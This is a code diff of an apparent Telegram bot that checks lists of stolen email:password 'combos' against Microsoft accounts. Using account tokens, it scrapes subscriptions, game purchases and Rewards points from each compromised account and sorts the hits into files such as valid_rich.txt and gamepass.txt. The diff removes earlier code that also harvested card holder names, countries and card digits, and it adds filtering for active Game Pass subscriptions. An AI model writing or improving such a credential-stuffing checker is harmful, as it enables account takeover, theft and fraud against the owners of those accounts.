@@ -8,6 +8,7 @@ import time
 import zipfile
 import shutil
 import uuid
+import datetime
 from urllib.parse import urlparse, parse_qs, quote
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types, F
@@ -91,55 +92,52 @@ async def get_pifd_atk(session):
 
 async def get_payment_data(session, atk):
     headers = {"User-Agent": UA_EDGE, "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
-    result = {"country": "Unknown", "holder": "N/A", "cards": [], "subs": [], "balance": "", "points": "0"}
+    result = {"subs": [], "points": "0"}
+    now = datetime.datetime.utcnow()
 
-    # 1. Payment Instruments (Holder & Country)
-    try:
-        url1 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
-        async with session.get(url1, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
-            if r.status == 200:
-                data = await r.json()
-                items = []
-                if isinstance(data, list):
-                    items = data
-                    for item in items:
-                        if 'country' in item: result['country'] = item['country'].upper()
-                        if 'accountHolderName' in item and result['holder'] == 'N/A': result['holder'] = item['accountHolderName']
-                        if 'lastFourDigits' in item:
-                            result["cards"].append(f"{item.get('paymentMethodFamily', 'CC')} *{item.get('lastFourDigits')}")
-                elif isinstance(data, dict):
-                    result['country'] = data.get('country', 'Unknown').upper()
-                    items = data.get('items', data.get('paymentInstruments', []))
-                    for item in items:
-                        if 'accountHolderName' in item and result['holder'] == 'N/A': result['holder'] = item['accountHolderName']
-                        if 'lastFourDigits' in item:
-                            result["cards"].append(f"{item.get('paymentMethodFamily', 'CC')} *{item.get('lastFourDigits')}")
-    except: pass
-
-    # 2. Subscriptions & Transactions
+    # 1. Transactions & Subs
     try:
         url2 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
         async with session.get(url2, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
             if r.status == 200:
                 data = await r.json()
+                
+                # Parse Subscriptions
                 for sub in data.get("subscriptions", []):
                     title = sub.get("title", "Unknown Sub")
-                    next_date = sub.get("nextRenewalDate", "")
-                    next_date = next_date.split("T")[0] if next_date else "N/A"
+                    next_date_str = sub.get("nextRenewalDate", "")
                     
-                    amt = sub.get("totalAmount", "")
-                    curr = sub.get("currency", "")
-                    price = f"{amt} {curr}" if amt and curr else ""
+                    is_active = False
+                    next_date = "N/A"
                     
-                    # Format: Title | Next Billing: Date | Price: Amount
-                    sub_str = f"{title}"
-                    if next_date != "N/A": sub_str += f" | Next Billing: {next_date}"
-                    if price: sub_str += f" | Price: {price}"
-                    
-                    result["subs"].append(sub_str)
+                    if next_date_str:
+                        try:
+                            dt = datetime.datetime.strptime(next_date_str.split("T")[0], "%Y-%m-%d")
+                            next_date = next_date_str.split("T")[0]
+                            if dt > now:
+                                is_active = True
+                        except:
+                            is_active = True
+                    else:
+                        # No renewal date usually means lifetime or active without renewal
+                        is_active = True
+                        
+                    if is_active:
+                        sub_str = f"{title}"
+                        if next_date != "N/A":
+                            sub_str += f" | Next Billing: {next_date}"
+                        result["subs"].append(sub_str)
+                
+                # Parse One-time Orders (Games)
+                for order in data.get("orders", []):
+                    title = order.get("title", "Unknown Game")
+                    # Prevent duplicates if it's already listed as a sub
+                    if title and not any(title in s for s in result["subs"]):
+                        result["subs"].append(f"{title} (Game)")
+                        
     except: pass
 
-    # 3. Rewards Points
+    # 2. Rewards Points
     try:
         url3 = "https://rewards.bing.com/"
         async with session.get(url3, headers={"User-Agent": UA_EDGE}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
@@ -216,10 +214,10 @@ async def process_combos(combos, chat_id, status_msg, bot):
         if not r["data"]: continue
         d = r["data"]
         
-        card_str = ", ".join(d["cards"]) if d["cards"] else "None"
         sub_str = ", ".join(d["subs"]) if d["subs"] else "None"
         
-        line = f"{r['email']}:{r['pw']} | Region: {d['country']} | Holder: {d['holder']} | Points: {d['points']} | Cards: [{card_str}] | Subs: [{sub_str}]"
+        # New stripped down format
+        line = f"{r['email']}:{r['pw']} | Points: {d['points']} | Subs: [{sub_str}]"
         rich_valid.append(line)
 
     write_file("valid_rich.txt", rich_valid)
@@ -228,17 +226,13 @@ async def process_combos(combos, chat_id, status_msg, bot):
     write_file("2fa.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
     
     gp = []
-    cc = []
     for r in valid:
         if not r["data"]: continue
         d = r["data"]
-        if any("pass" in s.lower() for s in d["subs"]):
+        if any("pass" in s.lower() or "game pass" in s.lower() for s in d["subs"]):
             gp.append(f"{r['email']}:{r['pw']} | {', '.join(d['subs'])}")
-        if d["cards"]:
-            cc.append(f"{r['email']}:{r['pw']} | {', '.join(d['cards'])}")
             
     if gp: write_file("gamepass.txt", gp)
-    if cc: write_file("cards.txt", cc)
 
     write_file("summary.txt", [f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Valid: {len(valid)}", f"Invalid: {len(bad)}", f"2FA: {len(tfa)}"])
 
